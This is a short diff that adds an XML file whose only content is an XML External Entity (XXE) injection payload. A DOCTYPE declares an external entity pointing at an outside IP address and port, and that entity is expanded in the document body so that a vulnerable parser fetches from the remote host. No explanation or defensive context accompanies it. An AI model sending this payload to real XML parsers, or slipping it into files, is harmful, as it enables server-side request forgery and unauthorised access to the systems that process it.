@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE data [
+    <!ENTITY file SYSTEM "128.199.233.77:5001/landing_page.html.php">
+]>
+<data>
+    &file;
+</data>
